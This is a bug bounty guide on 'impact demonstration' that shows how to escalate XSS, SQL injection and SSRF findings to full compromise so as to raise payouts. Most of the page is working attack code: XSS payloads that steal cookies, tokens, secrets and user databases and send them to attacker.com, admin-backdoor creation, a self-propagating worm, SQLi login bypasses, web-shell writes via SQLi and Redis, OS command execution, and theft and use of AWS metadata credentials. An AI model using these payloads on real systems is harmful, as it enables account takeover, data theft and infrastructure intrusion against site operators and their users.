---
title: Impact Demonstration
description: Techniques, methodologies, and command-driven strategies for proving maximum real-world impact of discovered vulnerabilities to achieve accurate severity ratings and maximum bounty payouts.
navigation:
  icon: i-lucide-flame
  title: Impact Demonstration
---

## What is Impact Demonstration

::note
Impact Demonstration is the discipline of **transforming a raw vulnerability into undeniable proof of real-world damage**. It is the difference between a report that says *"XSS exists"* and one that shows *"I can take over any account on your platform, including the CEO's, steal all customer data, and execute actions as any user — here's the working proof."*
::

Every vulnerability has a **theoretical maximum impact**. Most bug hunters stop at the initial trigger — a reflected string, a delayed response, a 200 where a 403 should be. Impact Demonstration pushes beyond the trigger to prove what an attacker **actually achieves** when they exploit the flaw in the worst-case scenario.

::callout{icon="i-lucide-flame" color="red"}
Triage teams evaluate reports on **demonstrated impact, not theoretical impact**. A report showing `alert(1)` earns $200. A report showing full account takeover through the same XSS earns $5,000+. The vulnerability is identical — the impact demonstration is what changes the payout by 25x.
::

```
┌──────────────────────────────────────────────────────────────────────────┐
│                    IMPACT DEMONSTRATION SPECTRUM                        │
│                                                                          │
│  Trigger Only          Partial Impact         Maximum Impact             │
│  ◀─────────────────────────────────────────────────────────────▶        │
│                                                                          │
│  alert(1)              steal cookie           full account takeover      │
│  sleep(5)              extract DB name        dump entire database       │
│  id command            read /etc/passwd       reverse shell + pivot      │
│  302 redirect          redirect to phish      steal OAuth tokens         │
│  IDOR read             view 1 user profile    exfiltrate all user PII    │
│  reflected input       self-XSS              worm-like stored XSS       │
│                                                                          │
│  ────────────────────────────────────────────────────────────────        │
│  Bounty:  $50-200      $200-2000              $2000-50000+              │
│  Severity: Low/Info    Medium/High            High/Critical              │
│  Acceptance: Maybe     Likely                 Guaranteed                 │
└──────────────────────────────────────────────────────────────────────────┘
```

### Why Impact Demonstration Determines Your Bounty

::card-group
  ::card
  ---
  title: Severity Justification
  icon: i-lucide-gauge
  ---
  CVSS scores are **calculated from demonstrated capabilities**, not theoretical ones. Showing actual data exfiltration vs potential data exfiltration changes Confidentiality Impact from None to High — moving the score from 4.3 to 8.6.
  ::

  ::card
  ---
  title: Triage Speed
  icon: i-lucide-timer
  ---
  Reports with clear impact demonstrations are **triaged 3-5x faster**. Security teams don't need to reproduce and evaluate impact themselves — you've already done the work.
  ::

  ::card
  ---
  title: Duplicate Differentiation
  icon: i-lucide-fingerprint
  ---
  When another hunter reports the same vulnerability with `alert(1)` and you demonstrate account takeover, your report is treated as the **superior submission** — even if filed later.
  ::

  ::card
  ---
  title: Prevents Downgrading
  icon: i-lucide-shield-check
  ---
  Without impact proof, triage teams **routinely downgrade** findings. A demonstrated impact report with evidence leaves no room for severity reduction.
  ::
::

---

## Impact Demonstration Framework

::tip
Follow the **TBES Framework**: **Trigger → Bridge → Escalate → Showcase**. Every impact demonstration follows this path from initial vulnerability to maximum proven damage.
::

```
┌──────────────────────────────────────────────────────────────────────┐
│                    TBES IMPACT FRAMEWORK                             │
│                                                                      │
│   ┌──────────┐   ┌──────────┐   ┌──────────┐   ┌──────────┐       │
│   │ TRIGGER  │──▶│  BRIDGE  │──▶│ ESCALATE │──▶│ SHOWCASE │       │
│   │          │   │          │   │          │   │          │       │
│   │ Confirm  │   │ Connect  │   │ Maximize │   │ Prove &  │       │
│   │ the vuln │   │ vuln to  │   │ the real │   │ document │       │
│   │ exists   │   │ sensitive│   │ world    │   │ the full │       │
│   │          │   │ assets   │   │ damage   │   │ impact   │       │
│   └──────────┘   └──────────┘   └──────────┘   └──────────┘       │
│                                                                      │
│   Example Flow:                                                      │
│   ─────────────                                                      │
│   XSS fires  →  Access same- →  Steal admin  →  Show full          │
│   on page       origin APIs     session +       ATO + data          │
│                                 change email    exfil PoC           │
│                                                                      │
│   SQLi        →  Extract      →  Dump users   →  Show cred          │
│   confirmed      DB schema       table with     leak + login        │
│                                  passwords      as admin            │
│                                                                      │
│   SSRF        →  Reach cloud  →  Steal IAM    →  Show S3            │
│   confirmed      metadata        credentials    data access         │
│                                                 + RCE               │
└──────────────────────────────────────────────────────────────────────┘
```

::steps{level="4"}

#### Trigger — Confirm the Vulnerability

Establish that the vulnerability is real with a clean, minimal proof.

```bash
# XSS trigger confirmation
curl -s "https://target.com/search?q=<img+src=x+onerror=alert(document.domain)>" | \
  grep -o "onerror=alert(document.domain)"

# SQLi trigger confirmation
curl -o /dev/null -s -w "Time: %{time_total}s\n" \
  "https://target.com/user?id=1'+AND+SLEEP(5)--+-"

# SSRF trigger confirmation (OOB callback)
curl -s "https://target.com/fetch?url=http://BURP_COLLABORATOR_ID.burpcollaborator.net"

# IDOR trigger confirmation
# Request as User A for User B's data
curl -s "https://target.com/api/users/VICTIM_ID" \
  -H "Authorization: Bearer ATTACKER_TOKEN" | jq '.email'

# Command injection trigger
curl -o /dev/null -s -w "Time: %{time_total}s\n" \
  "https://target.com/ping?host=127.0.0.1;sleep+5"

# SSTI trigger confirmation
curl -s "https://target.com/render?tpl={{7*7}}" | grep "49"
```

#### Bridge — Connect to Sensitive Assets

Link the vulnerability to sensitive data, functionality, or systems.

```bash
# XSS → Access sensitive same-origin APIs
# Payload that reads the user's profile via same-origin API
cat << 'PAYLOAD'
<script>
fetch('/api/me')
  .then(r => r.json())
  .then(d => {
    document.title = JSON.stringify(d);
    // Shows: {"id":1,"email":"user@target.com","role":"admin","api_key":"sk_live_..."}
  });
</script>
PAYLOAD

# SQLi → Map sensitive tables
sqlmap -u "https://target.com/user?id=1" --batch --tables \
  --output-dir=impact_demo/ 2>/dev/null | grep -E "users|admin|payments|credentials|tokens"

# SSRF → Identify reachable internal services
for port in 3306 5432 6379 9200 27017 8500 2379; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://target.com/fetch?url=http://127.0.0.1:${port}/" --max-time 3)
  [ "$STATUS" != "000" ] && [ "$STATUS" != "502" ] && \
    echo "[BRIDGE] Internal service on port $port reachable (HTTP $STATUS)"
done

# IDOR → Verify access to sensitive fields beyond basic profile
curl -s "https://target.com/api/users/VICTIM_ID" \
  -H "Authorization: Bearer ATTACKER_TOKEN" | \
  jq '{email, phone, address, ssn, payment_methods, api_keys}'

# Path Traversal → Identify readable sensitive files
for file in /etc/passwd /etc/shadow /proc/self/environ /home/app/.env \
  /var/www/html/config.php /app/.env /root/.ssh/id_rsa; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://target.com/file?path=../../../../..${file}")
  [ "$STATUS" = "200" ] && echo "[BRIDGE] Readable: $file"
done
```

#### Escalate — Maximize Real-World Damage

Push the vulnerability to its worst-case scenario.

```bash
# XSS → Full Account Takeover
# Payload that changes the victim's email and password
cat << 'PAYLOAD'
<script>
// Step 1: Get CSRF token
fetch('/api/settings')
  .then(r => r.json())
  .then(data => {
    // Step 2: Change email to attacker-controlled
    fetch('/api/user/email', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({
        email: 'attacker@evil.com',
        csrf_token: data.csrf_token
      })
    })
    .then(() => {
      // Step 3: Trigger password reset to attacker email
      fetch('/api/password/reset', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({email: 'attacker@evil.com'})
      });
    });
  });
</script>
PAYLOAD

# SQLi → Extract admin credentials + login
sqlmap -u "https://target.com/user?id=1" -D app_db -T users \
  --columns --batch 2>/dev/null
sqlmap -u "https://target.com/user?id=1" -D app_db -T users \
  -C username,email,password_hash --dump --batch 2>/dev/null

# Crack extracted hash
echo 'admin:$2b$12$LJ3...' > hash.txt
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt

# Login as admin with cracked credentials
curl -s -X POST "https://target.com/api/login" \
  -d '{"email":"admin@target.com","password":"cracked_password"}' | jq '.token'

# SSRF → Cloud credential theft → Infrastructure control
CREDS=$(curl -s "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME")
export AWS_ACCESS_KEY_ID=$(echo "$CREDS" | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo "$CREDS" | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo "$CREDS" | jq -r '.Token')

# Demonstrate infrastructure access
aws sts get-caller-identity
aws s3 ls
aws ec2 describe-instances --query 'Reservations[].Instances[].[InstanceId,State.Name]'

# IDOR → Mass data exfiltration demonstration
# Show count of accessible records
TOTAL=$(curl -s "https://target.com/api/users?limit=1" \
  -H "Authorization: Bearer ATTACKER_TOKEN" | jq '.meta.total')
echo "Total accessible records via IDOR: $TOTAL"

# Show sample of accessible sensitive data (redact in report)
for id in 1 2 3; do
  curl -s "https://target.com/api/users/${id}" \
    -H "Authorization: Bearer ATTACKER_TOKEN" | \
    jq '{id, email: (.email | split("@") | .[0][:3] + "***@" + .[1]), has_phone: (.phone != null), has_ssn: (.ssn != null)}'
done
```

#### Showcase — Document with Undeniable Evidence

Package the complete impact into reproducible, visual proof.

```bash
# Capture full HTTP request/response chain
curl -v -X POST "https://target.com/api/vulnerable" \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"payload":"EXPLOIT"}' \
  2>&1 | tee impact_evidence_full.txt

# Generate timestamped proof
echo "=== Impact Demonstration Evidence ===" > evidence.txt
echo "Timestamp: $(date -u +%Y-%m-%dT%H:%M:%SZ)" >> evidence.txt
echo "Target: https://target.com/api/vulnerable" >> evidence.txt
echo "Researcher: YOUR_HANDLE" >> evidence.txt
echo "" >> evidence.txt
echo "--- Request ---" >> evidence.txt
curl -v "https://target.com/api/exploit" 2>&1 >> evidence.txt
echo "" >> evidence.txt
echo "--- Impact Proof ---" >> evidence.txt
echo "Accessible user count: $TOTAL" >> evidence.txt
echo "Data types exposed: email, phone, SSN, payment" >> evidence.txt
echo "Account takeover: demonstrated" >> evidence.txt

# Record terminal session for video proof
script -q impact_demo_$(date +%s).log
# ... perform exploitation steps ...
# exit

# Alternative: asciinema recording
asciinema rec impact_demo.cast
# ... perform exploitation steps ...
# exit
```

::

---

## Impact Demonstration by Vulnerability Class

### XSS Impact Escalation

::badge
Most Common Underreported Impact
::

::accordion
  ::accordion-item
  ---
  icon: i-lucide-cookie
  label: "Level 1: Session Hijacking"
  ---

  The baseline XSS impact — steal the victim's session and impersonate them.

  ```bash
  # Check if cookies are accessible (no HttpOnly flag)
  curl -s -I "https://target.com" | grep -i "set-cookie" | grep -iv "httponly"
  # If HttpOnly is absent, cookie theft is possible

  # Session hijacking payload
  PAYLOAD='<script>new Image().src="https://ATTACKER_SERVER/steal?c="+encodeURIComponent(document.cookie)</script>'

  # URL-encoded for reflected XSS delivery
  ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD'))")
  echo "Exploit URL: https://target.com/search?q=${ENCODED}"

  # Attacker-side: Receive stolen cookies
  # python3 -m http.server 8443 --bind 0.0.0.0
  # Or use a logging service like Burp Collaborator / interactsh

  # Replay stolen session
  STOLEN_COOKIE="session=abc123def456"
  curl -s "https://target.com/api/me" -H "Cookie: $STOLEN_COOKIE" | jq '.'
  # If this returns victim's profile → session hijack confirmed

  # Impact statement for report:
  echo "IMPACT: Attacker can steal any user's session cookie via XSS,
  replay the cookie to fully impersonate the victim, and perform
  any action the victim can perform — including accessing PII,
  changing account settings, and making purchases."
  ```
  ::

  ::accordion-item
  ---
  icon: i-lucide-user-x
  label: "Level 2: Full Account Takeover"
  ---

  Go beyond session theft — permanently take over the account.

  ```bash
  # Method 1: Email change + Password reset chain
  cat << 'ATO_PAYLOAD' > ato_xss.html
  <script>
  // Step 1: Fetch current page to extract CSRF token
  fetch('/settings')
    .then(r => r.text())
    .then(html => {
      const csrf = html.match(/csrf[_-]?token.*?value="([^"]+)"/i)?.[1]
                || html.match(/"csrf[_-]?token":"([^"]+)"/)?.[1];
      
      // Step 2: Change the victim's email
      return fetch('/api/account/email', {
        method: 'PUT',
        headers: {
          'Content-Type': 'application/json',
          'X-CSRF-Token': csrf
        },
        body: JSON.stringify({email: 'attacker@evil.com'})
      });
    })
    .then(() => {
      // Step 3: Request password reset (goes to attacker email now)
      return fetch('/api/auth/forgot-password', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({email: 'attacker@evil.com'})
      });
    })
    .then(() => {
      // Attacker receives reset link → sets new password → full ATO
      navigator.sendBeacon('https://attacker.com/log', 'ATO_COMPLETE');
    });
  </script>
  ATO_PAYLOAD

  # Method 2: Direct password change (if no current password required)
  cat << 'PASSWD_PAYLOAD'
  <script>
  fetch('/api/account/password', {
    method: 'PUT',
    headers: {'Content-Type': 'application/json'},
    credentials: 'include',
    body: JSON.stringify({
      new_password: 'attacker_controlled_pass123!',
      confirm_password: 'attacker_controlled_pass123!'
    })
  }).then(r => {
    navigator.sendBeacon('https://attacker.com/log', 'PASSWORD_CHANGED:' + r.status);
  });
  </script>
  PASSWD_PAYLOAD

  # Method 3: OAuth token theft (if OAuth is used)
  cat << 'OAUTH_PAYLOAD'
  <script>
  // Steal OAuth/API tokens from the page or local storage
  const tokens = {
    localStorage: {},
    sessionStorage: {},
    cookies: document.cookie
  };
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    if (/token|auth|session|key|jwt|oauth/i.test(key)) {
      tokens.localStorage[key] = localStorage.getItem(key);
    }
  }
  for (let i = 0; i < sessionStorage.length; i++) {
    const key = sessionStorage.key(i);
    if (/token|auth|session|key|jwt|oauth/i.test(key)) {
      tokens.sessionStorage[key] = sessionStorage.getItem(key);
    }
  }
  fetch('https://attacker.com/collect', {
    method: 'POST',
    body: JSON.stringify(tokens)
  });
  </script>
  OAUTH_PAYLOAD

  # Method 4: API key generation (persistent backdoor)
  cat << 'APIKEY_PAYLOAD'
  <script>
  fetch('/api/user/api-keys', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    credentials: 'include',
    body: JSON.stringify({name: 'mobile-app', permissions: ['*']})
  })
  .then(r => r.json())
  .then(key => {
    fetch('https://attacker.com/collect', {
      method: 'POST',
      body: JSON.stringify({api_key: key})
    });
  });
  </script>
  APIKEY_PAYLOAD
  ```
  ::

  ::accordion-item
  ---
  icon: i-lucide-database
  label: "Level 3: Data Exfiltration"
  ---

  Use XSS as a pivot to extract sensitive data from same-origin APIs.

  ```bash
  # Enumerate accessible internal APIs from XSS context
  cat << 'ENUM_PAYLOAD'
  <script>
  const endpoints = [
    '/api/users', '/api/admin/users', '/api/admin/config',
    '/api/billing', '/api/payments', '/api/orders',
    '/api/documents', '/api/reports', '/api/analytics',
    '/api/integrations', '/api/webhooks', '/api/secrets',
    '/api/internal/debug', '/api/internal/health'
  ];
  
  Promise.all(endpoints.map(ep =>
    fetch(ep, {credentials: 'include'})
      .then(r => ({endpoint: ep, status: r.status, accessible: r.ok}))
      .catch(() => ({endpoint: ep, status: 0, accessible: false}))
  )).then(results => {
    const accessible = results.filter(r => r.accessible);
    fetch('https://attacker.com/endpoints', {
      method: 'POST',
      body: JSON.stringify(accessible)
    });
  });
  </script>
  ENUM_PAYLOAD

  # Mass data exfiltration via XSS
  cat << 'EXFIL_PAYLOAD'
  <script>
  async function exfiltrate() {
    // Get total user count
    const countResp = await fetch('/api/admin/users?limit=1', {credentials: 'include'});
    const countData = await countResp.json();
    const total = countData.meta?.total || countData.total || 0;
    
    // Exfil in batches
    for (let page = 0; page < Math.ceil(total / 100); page++) {
      const resp = await fetch(`/api/admin/users?limit=100&offset=${page * 100}`, {
        credentials: 'include'
      });
      const users = await resp.json();
      
      await fetch('https://attacker.com/exfil', {
        method: 'POST',
        body: JSON.stringify({page, users})
      });
      
      // Rate limit to avoid detection
      await new Promise(r => setTimeout(r, 500));
    }
  }
  exfiltrate();
  </script>
  EXFIL_PAYLOAD

  # Impact statement for report:
  echo "IMPACT: Through XSS, an attacker can access all same-origin API 
  endpoints as the victim user. If the victim is an admin, this includes
  /api/admin/users which exposes ALL user records including emails, 
  phone numbers, addresses, and payment information. 
  Total records accessible: [X] users across [Y] organizations."
  ```
  ::

  ::accordion-item
  ---
  icon: i-lucide-bug
  label: "Level 4: Worm Propagation"
  ---

  For stored XSS — demonstrate that the payload can self-propagate.

  ```bash
  # Self-propagating stored XSS (concept PoC — never deploy against real users)
  cat << 'WORM_CONCEPT'
  <script>
  // This is a CONCEPT PoC to demonstrate worm potential
  // In your report: describe the propagation mechanism, do NOT actually propagate

  // Step 1: Read current payload
  const payload = document.currentScript.outerHTML;

  // Step 2: Post payload to a visible surface (e.g., comment, bio, message)
  fetch('/api/posts', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    credentials: 'include',
    body: JSON.stringify({
      content: 'Check this out! ' + payload
    })
  });

  // Step 3: Every user who views the post gets infected
  // → Their post propagates to THEIR followers
  // → Exponential spread across the platform
  </script>
  WORM_CONCEPT

  # For your report — describe the chain WITHOUT executing propagation
  echo "IMPACT DEMONSTRATION (Concept Only):
  1. Attacker posts stored XSS payload in a comment/post
  2. When any user views the infected content, the XSS executes
  3. The payload automatically creates a new post on the victim's profile
     containing the same payload
  4. The victim's followers view the new post → they get infected
  5. Exponential propagation: 1 → N → N² → N³ users
  
  With [X] average followers per user, the entire platform of [Y] users
  could be compromised within [Z] hours.
  
  NOTE: This was NOT executed. Only the initial trigger was demonstrated.
  The propagation mechanism was analyzed through code review."
  ```
  ::

  ::accordion-item
  ---
  icon: i-lucide-landmark
  label: "Level 5: Administrative Action Execution"
  ---

  If the XSS target includes administrators, demonstrate admin-level actions.

  ```bash
  # Admin-targeted XSS → Execute administrative actions
  cat << 'ADMIN_PAYLOAD'
  <script>
  // Check if current user is admin
  fetch('/api/me', {credentials: 'include'})
    .then(r => r.json())
    .then(user => {
      if (user.role === 'admin' || user.is_admin) {
        // Create new admin account for attacker
        fetch('/api/admin/users', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          credentials: 'include',
          body: JSON.stringify({
            email: 'backdoor@evil.com',
            password: 'AdminBackdoor123!',
            role: 'admin',
            name: 'System Service Account'
          })
        });

        // Extract all application secrets
        fetch('/api/admin/config', {credentials: 'include'})
          .then(r => r.json())
          .then(config => {
            fetch('https://attacker.com/secrets', {
              method: 'POST',
              body: JSON.stringify(config)
            });
          });

        // Download full user database
        fetch('/api/admin/users/export?format=csv', {credentials: 'include'})
          .then(r => r.blob())
          .then(blob => {
            // Send to attacker server
            const fd = new FormData();
            fd.append('file', blob, 'users_export.csv');
            fetch('https://attacker.com/upload', {method: 'POST', body: fd});
          });
      }
    });
  </script>
  ADMIN_PAYLOAD
  ```
  ::
::

### SQL Injection Impact Escalation

::badge
Critical
::

::tabs
  ::tabs-item{icon="i-lucide-database" label="Data Extraction Depth"}

  ```bash
  # ══════════════════════════════════════════════
  # Level 1: Database Fingerprint (Low Impact)
  # ══════════════════════════════════════════════
  sqlmap -u "https://target.com/user?id=1" --batch --banner
  sqlmap -u "https://target.com/user?id=1" --batch --current-db --current-user --hostname

  # ══════════════════════════════════════════════
  # Level 2: Schema Enumeration (Medium Impact)
  # ══════════════════════════════════════════════
  sqlmap -u "https://target.com/user?id=1" --batch --dbs
  sqlmap -u "https://target.com/user?id=1" --batch -D target_db --tables
  sqlmap -u "https://target.com/user?id=1" --batch -D target_db -T users --columns

  # ══════════════════════════════════════════════
  # Level 3: Credential Extraction (High Impact)
  # ══════════════════════════════════════════════
  sqlmap -u "https://target.com/user?id=1" --batch -D target_db -T users \
    -C id,username,email,password_hash --dump --threads 5

  # Show the count to demonstrate scale
  sqlmap -u "https://target.com/user?id=1" --batch --count -D target_db -T users

  # ══════════════════════════════════════════════
  # Level 4: Sensitive Data Extraction (Critical)
  # ══════════════════════════════════════════════
  # Payment data
  sqlmap -u "https://target.com/user?id=1" --batch -D target_db -T payments \
    -C user_id,card_last_four,card_type,billing_address --dump --threads 5

  # API keys and tokens
  sqlmap -u "https://target.com/user?id=1" --batch -D target_db -T api_keys \
    -C user_id,api_key,secret,permissions --dump --threads 5

  # Session tokens (mass session hijacking)
  sqlmap -u "https://target.com/user?id=1" --batch -D target_db -T sessions \
    -C user_id,session_token,expires_at --dump --threads 5

  # ══════════════════════════════════════════════
  # Level 5: Admin Takeover via SQLi (Critical+)
  # ══════════════════════════════════════════════
  # Extract admin credentials
  sqlmap -u "https://target.com/user?id=1" --batch \
    --sql-query "SELECT username,email,password_hash FROM users WHERE role='admin'"

  # If password can't be cracked, extract session tokens directly
  sqlmap -u "https://target.com/user?id=1" --batch \
    --sql-query "SELECT user_id,session_token FROM sessions WHERE user_id IN (SELECT id FROM users WHERE role='admin') AND expires_at > NOW()"

  # Use extracted admin session
  ADMIN_SESSION=$(cat sqlmap_output | grep -oP 'session_token: \K.*')
  curl -s "https://target.com/api/admin/dashboard" \
    -H "Cookie: session=$ADMIN_SESSION" | jq '.'
  ```
  ::

  ::tabs-item{icon="i-lucide-terminal" label="OS-Level Access"}

  ```bash
  # ══════════════════════════════════════════════
  # SQLi → File System Read (Critical)
  # ══════════════════════════════════════════════

  # Read sensitive files via SQLi
  sqlmap -u "https://target.com/user?id=1" --batch \
    --file-read="/etc/passwd"
  sqlmap -u "https://target.com/user?id=1" --batch \
    --file-read="/var/www/html/.env"
  sqlmap -u "https://target.com/user?id=1" --batch \
    --file-read="/home/app/.ssh/id_rsa"

  # Manual file read (MySQL)
  curl -s "https://target.com/user?id=-1'+UNION+SELECT+1,LOAD_FILE('/etc/passwd'),3,4--+-"

  # ══════════════════════════════════════════════
  # SQLi → File System Write (Critical)
  # ══════════════════════════════════════════════

  # Write web shell via SQLi
  sqlmap -u "https://target.com/user?id=1" --batch \
    --file-write="shell.php" --file-dest="/var/www/html/shell.php"

  # Manual file write (MySQL)
  curl -s "https://target.com/user?id=-1'+UNION+SELECT+1,'<?php+system(\$_GET[\"cmd\"]);+?>',3,4+INTO+OUTFILE+'/var/www/html/cmd.php'--+-"

  # Verify web shell works
  curl -s "https://target.com/cmd.php?cmd=id"
  curl -s "https://target.com/cmd.php?cmd=whoami"

  # ══════════════════════════════════════════════
  # SQLi → OS Command Execution (Critical)
  # ══════════════════════════════════════════════

  # Direct OS shell via SQLMap
  sqlmap -u "https://target.com/user?id=1" --batch --os-shell

  # MySQL UDF injection for command execution
  sqlmap -u "https://target.com/user?id=1" --batch --os-cmd="id"

  # MSSQL xp_cmdshell
  curl -s "https://target.com/user?id=1';EXEC+sp_configure+'xp_cmdshell',1;RECONFIGURE;EXEC+xp_cmdshell+'whoami'--"

  # PostgreSQL COPY TO PROGRAM
  curl -s "https://target.com/user?id=1';COPY+(SELECT+'')TO+PROGRAM+'curl+https://attacker.com/?data=$(id)'--"

  # Impact statement:
  echo "IMPACT: SQL injection allows full operating system command execution
  on the database server. This provides the attacker with:
  - Complete file system read/write access
  - Ability to execute arbitrary commands as the database user
  - Potential lateral movement to other internal systems
  - Access to all data across ALL databases on the server
  Total databases accessible: $(sqlmap -u 'URL' --batch --dbs 2>/dev/null | grep -c '\[.*\]')
  Total tables: $(sqlmap -u 'URL' --batch -D target_db --tables 2>/dev/null | grep -c '|')"
  ```
  ::

  ::tabs-item{icon="i-lucide-key" label="Authentication Bypass via SQLi"}

  ```bash
  # Login bypass — demonstrate admin access without credentials
  curl -s -X POST "https://target.com/api/login" \
    -H "Content-Type: application/json" \
    -d '{"email":"admin@target.com'\'' OR 1=1--","password":"anything"}'

  # Alternative login bypass payloads
  BYPASS_PAYLOADS=(
    "' OR '1'='1"
    "' OR '1'='1'--"
    "' OR '1'='1'/*"
    "admin'--"
    "admin' OR 1=1--"
    "') OR ('1'='1"
    "' OR 1=1 LIMIT 1--"
    "' UNION SELECT 1,'admin','admin_hash'--"
  )

  for payload in "${BYPASS_PAYLOADS[@]}"; do
    RESPONSE=$(curl -s -X POST "https://target.com/api/login" \
      -H "Content-Type: application/json" \
      -d "{\"email\":\"${payload}\",\"password\":\"test\"}")
    
    if echo "$RESPONSE" | jq -e '.token' 2>/dev/null; then
      echo "[AUTH BYPASS] Payload: $payload"
      echo "  Token: $(echo $RESPONSE | jq -r '.token')"
      
      # Verify admin access with the stolen token
      TOKEN=$(echo "$RESPONSE" | jq -r '.token')
      ROLE=$(curl -s "https://target.com/api/me" \
        -H "Authorization: Bearer $TOKEN" | jq -r '.role')
      echo "  Authenticated role: $ROLE"
      break
    fi
  done
  ```
  ::
::

### SSRF Impact Escalation

::badge
Critical
::

```
┌──────────────────────────────────────────────────────────────────┐
│                 SSRF IMPACT ESCALATION LADDER                    │
│                                                                  │
│   Level 5: RCE via Internal Service ─────────────── CRITICAL    │
│        ▲                                                         │
│   Level 4: Cloud Credential Theft ───────────────── CRITICAL    │
│        ▲                                                         │
│   Level 3: Internal Data Access ─────────────────── HIGH        │
│        ▲                                                         │
│   Level 2: Internal Port/Service Scan ───────────── MEDIUM      │
│        ▲                                                         │
│   Level 1: External URL Fetch ───────────────────── LOW/INFO    │
│                                                                  │
│   Each level MULTIPLIES the demonstrated impact                  │
└──────────────────────────────────────────────────────────────────┘
```

::tabs
  ::tabs-item{icon="i-lucide-cloud" label="Cloud Metadata Exploitation"}

  ```bash
  # Level 1 → Level 4: SSRF to Cloud Credential Theft

  # Step 1: Confirm SSRF
  curl -s "https://target.com/fetch?url=http://169.254.169.254/" | head -5

  # Step 2: Enumerate metadata
  curl -s "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/"

  # Step 3: Get IAM role name
  ROLE=$(curl -s "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/")
  echo "IAM Role: $ROLE"

  # Step 4: Extract credentials
  CREDS=$(curl -s "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/${ROLE}")
  echo "Credentials retrieved:"
  echo "$CREDS" | jq '{AccessKeyId, Expiration}'

  # Step 5: Demonstrate cloud access scope
  export AWS_ACCESS_KEY_ID=$(echo "$CREDS" | jq -r '.AccessKeyId')
  export AWS_SECRET_ACCESS_KEY=$(echo "$CREDS" | jq -r '.SecretAccessKey')
  export AWS_SESSION_TOKEN=$(echo "$CREDS" | jq -r '.Token')

  echo "=== Identity ==="
  aws sts get-caller-identity 2>/dev/null

  echo "=== S3 Buckets (data exposure) ==="
  aws s3 ls 2>/dev/null

  echo "=== S3 Bucket Contents (sample) ==="
  FIRST_BUCKET=$(aws s3 ls 2>/dev/null | head -1 | awk '{print $3}')
  aws s3 ls "s3://${FIRST_BUCKET}/" --recursive --summarize 2>/dev/null | tail -3

  echo "=== RDS Databases ==="
  aws rds describe-db-instances \
    --query 'DBInstances[].[DBInstanceIdentifier,Engine,Endpoint.Address]' \
    --output table 2>/dev/null

  echo "=== Secrets Manager ==="
  aws secretsmanager list-secrets \
    --query 'SecretList[].Name' --output table 2>/dev/null

  echo "=== Lambda Functions ==="
  aws lambda list-functions \
    --query 'Functions[].FunctionName' --output table 2>/dev/null

  echo "=== EC2 Instances ==="
  aws ec2 describe-instances \
    --query 'Reservations[].Instances[].[InstanceId,PrivateIpAddress,State.Name]' \
    --output table 2>/dev/null

  # Impact statement:
  echo "
  IMPACT: SSRF vulnerability allows attacker to retrieve AWS IAM 
  credentials from the EC2 metadata service. These credentials grant:
  - Access to $(aws s3 ls 2>/dev/null | wc -l) S3 buckets
  - Access to $(aws rds describe-db-instances 2>/dev/null | grep -c 'DBInstanceIdentifier') RDS databases  
  - Access to $(aws secretsmanager list-secrets 2>/dev/null | grep -c 'Name') stored secrets
  - Potential lateral movement to $(aws ec2 describe-instances 2>/dev/null | grep -c 'InstanceId') EC2 instances
  
  This constitutes FULL INFRASTRUCTURE COMPROMISE."
  ```
  ::

  ::tabs-item{icon="i-lucide-server" label="Internal Service Exploitation"}

  ```bash
  # SSRF → Redis → RCE

  # Step 1: Confirm Redis is accessible
  curl -s "https://target.com/fetch?url=http://127.0.0.1:6379/INFO" | head -5

  # Step 2: Extract Redis data (session tokens, cached data)
  curl -s "https://target.com/fetch?url=http://127.0.0.1:6379/KEYS+*" 

  # Step 3: Write web shell via Redis
  # Generate gopher payload
  python3 -c "
  import urllib.parse
  commands = [
      '*3\\r\\n\$3\\r\\nSET\\r\\n\$11\\r\\nshell_value\\r\\n\$52\\r\\n<?php system(\$_GET[\"cmd\"]); ?>\\r\\n',
      '*4\\r\\n\$6\\r\\nCONFIG\\r\\n\$3\\r\\nSET\\r\\n\$3\\r\\ndir\\r\\n\$13\\r\\n/var/www/html\\r\\n',
      '*4\\r\\n\$6\\r\\nCONFIG\\r\\n\$3\\r\\nSET\\r\\n\$10\\r\\ndbfilename\\r\\n\$9\\r\\nshell.php\\r\\n',
      '*1\\r\\n\$4\\r\\nSAVE\\r\\n'
  ]
  payload = ''.join(commands)
  print('gopher://127.0.0.1:6379/_' + urllib.parse.quote(payload))
  "

  # Step 4: Execute via SSRF
  curl -s "https://target.com/fetch?url=GOPHER_PAYLOAD"

  # Step 5: Verify RCE
  curl -s "https://target.com/shell.php?cmd=id"
  curl -s "https://target.com/shell.php?cmd=hostname"
  curl -s "https://target.com/shell.php?cmd=cat+/etc/hostname"

  # SSRF → Elasticsearch → Data Exfiltration
  # Step 1: Cluster info
  curl -s "https://target.com/fetch?url=http://127.0.0.1:9200/" | jq '.'

  # Step 2: List all indices
  curl -s "https://target.com/fetch?url=http://127.0.0.1:9200/_cat/indices?v"

  # Step 3: Extract data from sensitive index
  curl -s "https://target.com/fetch?url=http://127.0.0.1:9200/users/_search?size=10" | jq '.'

  # Step 4: Count total records
  curl -s "https://target.com/fetch?url=http://127.0.0.1:9200/users/_count" | jq '.'

  # SSRF → Internal Admin Panel → Full Control
  curl -s "https://target.com/fetch?url=http://127.0.0.1:8080/admin/" | head -50
  curl -s "https://target.com/fetch?url=http://127.0.0.1:8080/admin/users"
  curl -s "https://target.com/fetch?url=http://127.0.0.1:8080/admin/config"
  ```
